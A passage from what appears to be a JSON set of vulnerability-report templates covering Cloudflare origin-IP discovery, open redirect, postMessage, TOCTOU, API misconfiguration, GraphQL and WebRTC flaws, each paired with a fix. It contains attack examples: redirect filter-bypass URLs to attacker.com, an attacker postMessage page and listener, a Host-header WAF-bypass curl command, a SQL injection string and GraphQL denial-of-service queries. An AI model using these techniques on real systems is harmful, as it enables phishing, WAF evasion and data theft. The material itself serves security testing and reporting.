    "   a. Use `dig` or `nslookup` on the domain. If it returns multiple A records or CNAMEs pointing to Cloudflare (e.g., `cloudflare.com` in the output), it's likely behind Cloudflare.",
    "   b. Inspect HTTP response headers for `Server: cloudflare`, `CF-Ray`, `CF-Cache-Status`, or `cf-connecting-ip`.",
    "   c. Use online tools like `SecurityHeaders.com` or `BuiltWith.com`.",
    "2. **Discover Origin IP (Bypass Techniques):**",
    "   a. **Historical DNS Records:** Use services like `SecurityTrails`, `Censys`, `Shodan`, or `DNSDumpster` to look for past DNS records. The origin IP might have been public before Cloudflare was enabled.",
    "   b. **Email Headers:** Send an email to an address on the target domain (if possible). Inspect the email headers (e.g., `Received: from [origin_ip]`) for the sender's actual IP address.",
    "   c. **SSL Certificate Information:** Sometimes, the SSL certificate for the origin server might reveal its IP address if it was generated before Cloudflare's proxying.",
    "   d. **Subdomain Scan:** Scan common subdomains (e.g., `mail.example.com`, `dev.example.com`, `ftp.example.com`) that might not be proxied by Cloudflare and thus expose the origin IP directly.",
    "   e. **Misconfigured DNS Records:** Look for A records pointing directly to the origin, or CNAME records that lead to non-Cloudflare services.",
    "   f. **Website-Specific Leaks:** Check for verbose error messages, `phpinfo()` pages, or other information disclosure vulnerabilities on the website itself that might reveal the origin IP.",
    "   g. **Direct IP Access with Host Header:** Once potential origin IPs are found, attempt to connect directly to the IP address using the target domain as the `Host` header (e.g., `curl -H 'Host: example.com' http://[origin_ip]/`). This often allows bypassing WAFs if the origin server is misconfigured to serve the domain directly.",
    "3. Document the Cloudflare presence and, if successful, the identified origin IP address."
  ],
  "proof_of_concept": {
    "command_example": "dig example.com",
    "http_header_example": "Server: cloudflare\nCF-Ray: 8a6b7c8d9e0f1234-AMD",
    "notes": "Provide the `dig` or `curl` output showing Cloudflare or the identified origin IP. If an origin IP is found, demonstrate direct access to it using a `Host` header to prove the bypass. Explain the technique used to uncover the origin IP."
  },
  "impact": "Bypassing Cloudflare's WAF and DDoS protection. Direct exposure of the origin server to attacks (e.g., brute-force, specific exploits for server software). Information disclosure about the backend infrastructure. Reduces the effectiveness of Cloudflare as a security solution.",
  "remediation_suggestion": "Ensure all public-facing services (including email, FTP, VPN) are behind Cloudflare or otherwise secured. Regularly review DNS records for any direct IP exposures. Implement strict firewall rules on the origin server to only accept connections from Cloudflare's IP ranges. Do not reveal internal IP addresses in application responses or logs. Consider using Cloudflare's Argo Tunnel for secure, direct connections to the origin."
},
{
  "vulnerability_name": "Open Redirect",
  "summary": "An Open Redirect vulnerability occurs when an application allows an attacker to control the URL that a user is redirected to. If the application does not validate user-supplied input used in redirection, an attacker can craft a URL that appears legitimate but redirects unsuspecting victims to a malicious site (e.g., phishing pages, malware downloads).",
  "severity": "Medium",
  "target": "[Specify affected application/endpoint, e.g., app.example.com]",
  "url_location": "[The vulnerable redirection endpoint, e.g., https://app.example.com/redirect?url=]",
  "steps_to_reproduce": [
    "1. Identify an endpoint that performs redirects based on URL parameters (e.g., `?next=`, `?redirect_to=`, `?return_url=`, `?continue=`). Common scenarios include login pages, logout pages, or single sign-on (SSO) flows.",
    "2. Test a basic valid redirect to confirm functionality: `https://app.example.com/login?next=/dashboard` should redirect to `/dashboard`.",
    "3. Replace the valid redirect URL with an external, attacker-controlled URL.",
    "   a. **Example Payload:** `https://app.example.com/login?next=https://attacker.com/phishing`",
    "   b. **Variations to bypass filters:**",
    "      - URL Encoding: `https://app.example.com/login?next=https%3A%2F%2Fattacker.com%2F`",
    "      - Double Encoding: `https://app.example.com/login?next=https%253A%252F%252Fattacker.com%252F`",
    "      - URL Shorteners: `https://app.example.com/login?next=bit.ly/malicious` (if resolved server-side)",
    "      - URL fragments: `https://app.example.com/login?next=/ legtimo.com@attacker.com` (may parse only legitimate.com or attacker.com depending on implementation)",
    "      - Backslashes: `https://app.example.com/login?next=\\attacker.com` (if `\\` is treated as `//`)",
    "      - Null bytes: `https://app.example.com/login?next=https://attacker.com%00`",
    "      - Whitelist bypass: `https://app.example.com/login?next=https://example.com.attacker.com` (if only prefix is checked)",
    "4. Observe that clicking the crafted URL from the legitimate domain redirects to the malicious site."
  ],
  "proof_of_concept": {
    "url_example": "https://app.example.com/redirect?next=https://malicious-site.com/phish",
    "notes": "Provide the full URL that triggers the open redirect. Include a screenshot or video showing the legitimate domain loading initially, followed by the redirect to the attacker's site. Explain how the attacker can leverage this for phishing."
  },
  "impact": "Facilitates highly credible phishing and social engineering attacks, as the initial URL appears legitimate, deceiving users into trusting the redirect. Can be chained with other vulnerabilities (e.g., XSS via `javascript:` schema, token leakage via referrer headers). Damages the reputation and trust associated with the legitimate domain.",
  "remediation_suggestion": "Avoid incorporating user-controllable input into redirection targets. If unavoidable, use an 'allow list' of safe, permitted redirection URLs. Only redirect to relative paths within the same application. Validate all redirection URLs against a strict regular expression that only allows trusted domains or relative paths. Implement a 'fixed domain' approach where only the path segment of the redirect URL is appended to a hardcoded domain. Do not rely on client-side validation alone."
},
{
  "vulnerability_name": "PostMessage Vulnerabilities",
  "summary": "PostMessage vulnerabilities arise when the `window.postMessage()` API is used insecurely. This API allows cross-origin communication between windows (e.g., a parent window and an iframe). If the `origin` of the message sender is not properly validated, or if sensitive data is sent to an untrusted origin, it can lead to information disclosure, Cross-Site Scripting (XSS), or UI redressing attacks.",
  "severity": "Medium",
  "target": "[Specify affected application/domain, e.g., parent.example.com or child.example.com]",
  "url_location": "[The URL of the page using postMessage(), e.g., https://parent.example.com/app]",
  "steps_to_reproduce": [
    "1. Identify pages using `window.postMessage()`: Look for `postMessage` and `addEventListener('message', ...)` in the application's JavaScript files using browser developer tools (Global Listeners, search for keywords).",
    "2. **[Scenario A: Missing/Weak Origin Validation in `addEventListener`]**",
    "   a. **Vulnerable Code Example:** `window.addEventListener('message', (event) => { /* process event.data */ });` (No `event.origin` check).",
    "   b. Create an attacker-controlled HTML page on `attacker.com`.",
    "   c. Embed the target vulnerable page in an iframe: `<iframe src='https://target.example.com/vulnerable_page.html'></iframe>` (or open a new window with `window.open()`).",
    "   d. From `attacker.com`, send a message to the target window: `iframe.contentWindow.postMessage('malicious_payload', '*');`",
    "   e. **[What happened]**: The `vulnerable_page.html` processes the `malicious_payload` from `attacker.com` without validating its origin, potentially leading to XSS or data leakage if the payload manipulates the DOM or sensitive data.",
    "   f. **[What should happen]**: The `addEventListener` callback should always check `event.origin` against an expected origin(s).",
    "3. **[Scenario B: Sending Sensitive Data to Wildcard Target Origin]**",
    "   a. **Vulnerable Code Example:** `targetWindow.postMessage(sensitiveData, '*');`",
    "   b. Intercept network traffic or analyze client-side JavaScript to find `postMessage` calls sending sensitive data (e.g., user tokens, PII).",
    "   c. If a message is sent with `targetOrigin = '*'`, an attacker can host a page and listen for all messages:",
    "      `window.addEventListener('message', (event) => { console.log(event.data); });`",
    "   d. **[What happened]**: Sensitive data is sent to any window, including an attacker's window, leading to information disclosure.",
    "   e. **[What should happen]**: Always specify a precise `targetOrigin` for `postMessage()`. If the origin is unknown, do not send sensitive data.",
    "4. Document the specific message sent/received and the lack of origin validation or overly permissive target origin."
  ],
  "proof_of_concept": {
    "attacker_html_code": "<html><body><iframe id='targetFrame' src='https://vulnerable.example.com/app'></iframe><script>document.getElementById('targetFrame').onload = function() { document.getElementById('targetFrame').contentWindow.postMessage('alert(document.domain)', 'https://vulnerable.example.com'); };</script></body></html>",
    "notes": "Provide the JavaScript code demonstrating the insecure `postMessage` usage and the attacker's script to exploit it. Include screenshots of the successful exploitation (e.g., an XSS alert on the victim's domain, or sensitive data logged by the attacker's page). Clearly explain the role of the vulnerable origin or the lack of origin validation."
  },
  "impact": "Information disclosure (e.g., session tokens, user data). Cross-Site Scripting (XSS) if data is processed insecurely. UI redressing/clickjacking if the application allows malicious framing and message-based actions. Can lead to account takeover or further attacks.",
  "remediation_suggestion": "Always validate the `event.origin` property within the `addEventListener('message', ...)` callback to ensure the message comes from a trusted domain. Always specify a precise `targetOrigin` (e.g., `https://trusted.example.com`) in `postMessage()` calls, instead of `*`, especially when sending sensitive data. Never send sensitive data via `postMessage()` unless absolutely necessary and with strict origin validation on both sender and receiver. Implement Content Security Policy (CSP) headers (especially `frame-ancestors`) to control framing behavior."
},
{
  "vulnerability_name": "Time-of-Check Time-of-Use (TOCTOU)",
  "summary": "A Time-of-Check Time-of-Use (TOCTOU or TOC/TOU) vulnerability is a race condition that occurs when a system checks the state of a resource (Time-of-Check) and then uses that resource (Time-of-Use), but the state of the resource changes between the check and the use. An attacker can exploit this time window to alter the resource, leading to unauthorized access, privilege escalation, or data corruption.",
  "severity": "High",
  "target": "[Specify affected application/system component, e.g., file upload service, API endpoint]",
  "url_location": "[The endpoint involved in the TOCTOU operation, e.g., https://app.example.com/upload]",
  "steps_to_reproduce": [
    "1. Identify application functionalities that involve a sequence of operations where a check is followed by a use, especially those dealing with files, permissions, or system state.",
    "2. **[Scenario A: File System TOCTOU (e.g., Upload/Processing)]**",
    "   a. An application checks if a file's extension is safe (e.g., `.jpg`, `.png`) before allowing an upload.",
    "   b. An attacker uploads a file with a safe extension (e.g., `malicious.jpg`).",
    "   c. During the small window between the file extension check and its subsequent processing (e.g., renaming, moving, executing), the attacker quickly renames or replaces `malicious.jpg` with `malicious.php` or `malicious.sh`.",
    "   d. **[What happened]**: The application processes `malicious.php` as if it were an image file, potentially leading to remote code execution.",
    "   e. **[What should happen]**: The check and use should be atomic, or the file should be moved to a secure, non-executable temporary location before processing.",
    "3. **[Scenario B: Permission/Authorization TOCTOU]**",
    "   a. An application checks if a user has permission to access a resource.",
    "   b. The attacker initiates the request.",
    "   c. During the time between the permission check and the resource access, the attacker manages to revoke the user's permission (or grant it to another user), but the system still proceeds with the initial access.",
    "   d. **[What happened]**: Unauthorized access occurs due to the race condition.",
    "   e. **[What should happen]**: Permissions should be re-verified or locked during critical operations.",
    "4. **[Scenario C: Rate Limiting / Concurrent Operations TOCTOU]**",
    "   a. A system allows a limited number of operations per user per unit time (e.g., 5 password reset attempts per minute).",
    "   b. An attacker sends multiple password reset requests almost simultaneously, aiming to exploit the time difference between the check (remaining attempts) and the use (decrementing attempts).",
    "   c. **[What happened]**: The attacker bypasses the rate limit due to concurrent requests processing, allowing more attempts than intended.",
    "   d. **[What should happen]**: Rate limits should be atomically updated.",
    "5. Exploiting TOCTOU often requires precise timing and may involve custom scripts to rapidly change file states or send concurrent requests."
  ],
  "proof_of_concept": {
    "scenario_description": "To demonstrate file system TOCTOU: Upload 'legit.jpg'. While the server is processing, quickly rename 'legit.jpg' on the server to 'malicious.php' (requires another vulnerability, like directory traversal, or a highly controlled environment).",
    "notes": "Describe the sequence of events and the specific time window exploited. If possible, provide logs or evidence of the state change between the check and the use. Highlight the impact (e.g., 'Allowed execution of arbitrary PHP code'). TOCTOU exploitation can be complex to reproduce consistently without specific environment access."
  },
  "impact": "Privilege escalation, unauthorized access to resources, data corruption or deletion, bypassing security controls (e.g., file upload restrictions, rate limits). Can lead to system compromise and data integrity issues.",
  "remediation_suggestion": "Implement atomic operations: Ensure that checks and subsequent uses of resources are performed as a single, indivisible operation. Use locking mechanisms (file locks, mutexes) for critical resources. Adopt a 'fail-safe' or 'EAFP (Easier to Ask for Forgiveness than Permission)' approach, where operations are attempted, and failures are handled, rather than pre-checking. Generate unique, random filenames for uploaded files. Move files to a secure, non-executable directory immediately after upload and before any processing. Validate file content/type rigorously after the upload, not just by extension."
},
{
  "vulnerability_name": "API Misconfigurations",
  "summary": "API Misconfigurations refer to security vulnerabilities arising from insecure default configurations, improper settings, or exposed development/testing features in Application Programming Interfaces (APIs). This can lead to sensitive data exposure, unauthorized access, broken authentication/authorization, and other severe security risks.",
  "severity": "High",
  "target": "[Specify affected API endpoint, e.g., api.example.com/v1/users]",
  "url_location": "[The misconfigured API endpoint, e.g., https://api.example.com/v1/debug]",
  "steps_to_reproduce": [
    "1. Identify API endpoints (e.g., `/api/`, `/v1/`, `/graphql`, `/auth/`).",
    "2. **[Scenario A: Exposed Debug/Development Endpoints]**",
    "   a. Attempt to access common debug or development endpoints (e.g., `/debug`, `/admin`, `/test`, `/swagger`, `/api-docs`, `/healthz`).",
    "   b. **[What happened]**: An endpoint like `/debug` is accessible, revealing stack traces, environment variables, internal network details, or allowing unauthorized actions.",
    "   c. **[What should happen]**: These endpoints should be disabled or strictly access-controlled in production.",
    "3. **[Scenario B: Overly Permissive CORS Policy]**",
    "   a. Make an API request from an unauthorized origin (e.g., `attacker.com`) and check the `Access-Control-Allow-Origin` header in the response.",
    "   b. **[What happened]**: The `Access-Control-Allow-Origin: *` header is present, allowing any domain to make requests to the API, potentially leading to data leakage if the API returns sensitive data and credentials are sent.",
    "   c. **[What should happen]**: CORS should be configured to allow only trusted origins.",
    "4. **[Scenario C: Verbose Error Messages / Stack Traces]**",
    "   a. Send malformed requests or invalid parameters to the API.",
    "   b. **[What happened]**: The API returns detailed error messages, stack traces, or database errors, exposing internal structure, database schema, or configuration details.",
    "   c. **[What should happen]**: API error messages should be generic and not reveal sensitive information.",
    "5. **[Scenario D: Unnecessary HTTP Methods Enabled]**",
    "   a. Use different HTTP methods (e.g., `PUT`, `DELETE`, `OPTIONS`, `TRACE`) on endpoints that should only support `GET` or `POST`.",
    "   b. **[What happened]**: An endpoint that should only allow `GET` for reading allows `PUT` for modification, leading to unauthorized data changes.",
    "   c. **[What should happen]**: Only necessary HTTP methods should be enabled for each endpoint.",
    "6. **[Scenario E: Missing/Weak Rate Limiting]**",
    "   a. Send a large number of requests to an authentication, password reset, or resource-intensive endpoint in a short period.",
    "   b. **[What happened]**: The API does not enforce rate limiting, allowing brute-force attacks or denial of service.",
    "   c. **[What should happen]**: Robust rate limiting should be implemented on all critical endpoints.",
    "7. **[Scenario F: Unencrypted API Communication (HTTP over HTTPS)]**",
    "   a. Attempt to access the API over plain HTTP (`http://`).",
    "   b. **[What happened]**: The API responds over HTTP, potentially exposing sensitive data in cleartext during transit.",
    "   c. **[What should happen]**: APIs should enforce HTTPS for all communication."
  ],
  "proof_of_concept": {
    "url_example": "https://api.example.com/v1/healthz",
    "http_response_example": "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nContent-Type: application/json\n\n{\"status\":\"healthy\", \"db_connection_string\": \"sql://user:pass@127.0.0.1/db\"}",
    "notes": "Provide the API endpoint URL. Include the request and response (e.g., curl output or screenshot from proxy tool) that demonstrates the misconfiguration. Clearly explain what sensitive information was exposed or what unauthorized action was possible."
  },
  "impact": "Sensitive data exposure. Unauthorized access or actions. Broken authentication or authorization. Denial of service. Can lead to compliance violations, financial losses, and reputational damage.",
  "remediation_suggestion": "Implement secure default configurations for all API services. Disable or restrict access to all debug, development, and administrative endpoints in production. Implement strict CORS policies, only allowing trusted origins. Ensure API error messages are generic and do not reveal sensitive information or internal details. Only enable necessary HTTP methods for each endpoint. Implement robust rate limiting on all API endpoints. Enforce HTTPS for all API communication. Regularly audit API configurations and update software to the latest versions."
},
{
  "vulnerability_name": "GraphQL Specific Vulnerabilities",
  "summary": "GraphQL APIs, due to their flexible nature, introduce unique security vulnerabilities beyond traditional REST APIs. These include excessive data exposure, denial of service risks from complex queries, introspection abuse, and various types of injection if not properly handled.",
  "severity": "High",
  "target": "[Specify affected GraphQL endpoint, e.g., api.example.com/graphql]",
  "url_location": "[The GraphQL endpoint, e.g., https://api.example.com/graphql]",
  "steps_to_reproduce": [
    "1. Identify a GraphQL endpoint (common paths: `/graphql`, `/graphiql`, `/api`, `/v1/graphql`).",
    "2. **[Scenario A: Introspection Enabled]**",
    "   a. Send an introspection query to the endpoint. Example: `query { __schema { types { name } } }`",
    "   b. **[What happened]**: The server responds with the full schema, including types, fields, queries, and mutations, revealing the entire API structure, even if it's meant to be internal.",
    "   c. **[What should happen]**: Introspection should be disabled in production, or access to it strictly controlled.",
    "3. **[Scenario B: Excessive Data Exposure (Over-fetching)]**",
    "   a. Query for a resource, then add fields that should be restricted (e.g., `user { id name email passwordHash }`).",
    "   b. **[What happened]**: The API returns sensitive fields (e.g., `passwordHash`, internal IDs) that the current user should not have access to, even if they have access to the basic `user` object.",
    "   c. **[What should happen]**: Implement object-level authorization within resolvers to ensure only authorized fields are returned.",
    "4. **[Scenario C: Resource Exhaustion / DoS (Deep Queries, Batching, Aliases)]**",
    "   a. **Deep Query:** Send a deeply nested query (e.g., `user { friends { friends { ... } } }`) to exhaust server resources.",
    "   b. **Batching:** Send many queries in a single request (e.g., `[query { user(id:1){name} }, query { user(id:2){name} }]`).",
    "   c. **Alias Overloading:** Send the same complex query multiple times using aliases (e.g., `query { a: user(id:1){...} b: user(id:1){...} ... }`).",
    "   d. **[What happened]**: The server's response time increases significantly, or the server crashes, leading to a denial of service.",
    "   c. **[What should happen]**: Implement query depth limiting, query cost analysis, and rate limiting.",
    "5. **[Scenario D: Injection Attacks]**",
    "   a. If user input is passed directly to backend databases or systems, attempt SQL Injection, Command Injection, or XSS through GraphQL arguments. Example: `mutation { createUser(name: \"' OR 1=1--\") { id } }`.",
    "   b. **[What happened]**: The backend executes the injected payload.",
    "   c. **[What should happen]**: All user input should be properly sanitized and validated before use in backend operations.",
    "6. **[Scenario E: Broken Access Control (Function/Object Level)]**",
    "   a. Attempt to call mutations or queries that should be restricted to privileged users or specific roles.",
    "   b. Try to access or modify data for which the authenticated user is not authorized (e.g., `updateUser(id: 123, ...)` where `123` is another user's ID).",
    "   c. **[What happened]**: The API allows unauthorized actions or data access.",
    "   d. **[What should happen]**: Implement robust authorization checks at the resolver level for every field and operation."
  ],
  "proof_of_concept": {
    "graphql_query_example": "query { __schema { queryType { fields { name } } } }",
    "notes": "Provide the exact GraphQL query or mutation that demonstrates the vulnerability. Show the server's response. For information disclosure, highlight the sensitive data. For DoS, provide performance metrics. Explain the specific GraphQL feature exploited (e.g., 'Introspection enabled', 'Deep query allowed')."
  },
  "impact": "Sensitive data exposure. Denial of service. Unauthorized access to data or functions. Data tampering. Can lead to full system compromise and significant business impact. The flexible nature of GraphQL means a single vulnerability can have widespread consequences.",
  "remediation_suggestion": "Disable GraphQL introspection in production environments. Implement robust authorization checks at the resolver level for all fields and operations. Implement query depth limiting, query cost analysis, and rate limiting to prevent resource exhaustion. Thoroughly validate and sanitize all user input before processing. Remove or restrict access to GraphiQL or GraphQL Playground interfaces in production. Use a 'whitelist' approach for GraphQL queries where possible."
},
{
  "vulnerability_name": "WebRTC Vulnerabilities",
  "summary": "WebRTC (Web Real-Time Communication) vulnerabilities often arise from misconfigurations or inherent design aspects that can lead to IP address leakage, Man-in-the-Middle (MITM) attacks on signaling, denial of service, or exploitation of underlying browser vulnerabilities when handling real-time communication protocols.",
  "severity": "Medium",
  "target": "[Specify affected WebRTC application, e.g., video-chat.example.com]",
  "url_location": "[The URL of the WebRTC application, e.g., https://video-chat.example.com/call]",
  "steps_to_reproduce": [
    "1. Identify if a web application uses WebRTC (e.g., video calls, audio calls, screen sharing). Look for `RTCPeerConnection` objects in browser dev tools.",
    "2. **[Scenario A: IP Address Leakage (STUN/TURN Misconfiguration)]**",
    "   a. Use an online WebRTC leak test tool (e.g., `browserleaks.com/webrtc`, `ipx.ac/run`) or manually inspect ICE (Interactive Connectivity Establishment) candidates in the browser's `chrome://webrtc-internals` page (or equivalent for other browsers).",
    "   b. **[What happened]**: The user's actual local and/or public IP address (including VPN-protected IPs) is revealed, even when a VPN or proxy is active.",
    "   c. **[What should happen]**: WebRTC should be configured to only use relay (TURN) servers to hide direct IP addresses, or certain network interfaces should be excluded.",
    "3. **[Scenario B: Signaling Channel Insecurity]**",
    "   a. If the signaling channel (used for exchanging session descriptions and ICE candidates) is not secured with HTTPS/WSS.",
    "   b. Intercept traffic over HTTP or plain WebSocket (`ws://`) during call setup.",
    "   c. **[What happened]**: Sensitive session details (e.g., SDP offers/answers, ICE candidates) are exposed in cleartext, enabling eavesdropping or manipulation of the call setup by a MITM attacker.",
    "   d. **[What should happen]**: Signaling should always use HTTPS/WSS.",
    "4. **[Scenario C: Media Stream Eavesdropping (DTLS-SRTP Failure)]**",
    "   a. While WebRTC mandates encryption for media streams via DTLS-SRTP, look for any misconfigurations or bugs that might disable this. (Highly unlikely in modern browsers but theoretical).",
    "   b. **[What happened]**: Media (audio/video) streams are transmitted without encryption.",
    "   c. **[What should happen]**: DTLS-SRTP must be active and correctly negotiated.",
    "5. **[Scenario D: Denial of Service (DoS)]**",
    "   a. Flood the WebRTC signaling server with excessive connection requests or malformed SDP messages.",
    "   b. **[What happened]**: The signaling server becomes unresponsive, preventing legitimate users from establishing calls.",
    "   c. **[What should happen]**: Implement rate limiting and robust input validation on the signaling server.",
    "6. **[Scenario E: Cross-Site Scripting (XSS) / Input Validation Issues]**",
    "   a. If the WebRTC application displays user-controlled data (e.g., chat messages, display names) without proper sanitization.",
    "   b. Inject XSS payloads into these fields.",
    "   c. **[What happened]**: The XSS payload executes in the context of the victim's browser, potentially leading to session hijacking or data theft.",
    "   d. **[What should happen]**: All user input should be thoroughly sanitized before rendering."
  ],
  "proof_of_concept": {
    "webrtc_leak_test_url": "https://browserleaks.com/webrtc",
    "notes": "For IP leakage, provide a screenshot of the WebRTC leak test tool showing the exposed IP. For signaling issues, provide intercepted traffic showing cleartext sensitive data during call setup. Explain the specific WebRTC component (STUN/TURN, signaling) and how it's misconfigured."
  },
  "impact": "Privacy violation due to IP address leakage (even behind VPNs). Eavesdropping on call metadata or media (if encryption fails). Denial of service for real-time communication features. Potential for XSS and other browser-based attacks if combined with input validation flaws. Can lead to reputational damage.",
  "remediation_suggestion": "Prioritize using TURN (Traversal Using Relays around NAT) servers to relay all media traffic, preventing direct peer-to-peer connections and thus hiding IP addresses. Ensure all signaling communication is conducted over HTTPS or WSS (WebSocket Secure). Implement robust input validation and output encoding for all user-controlled data displayed within the WebRTC application to prevent XSS. Implement rate limiting on signaling servers to prevent DoS attacks. Regularly update browser and WebRTC library components. Be aware of browser-specific WebRTC settings and privacy controls."
}
    ]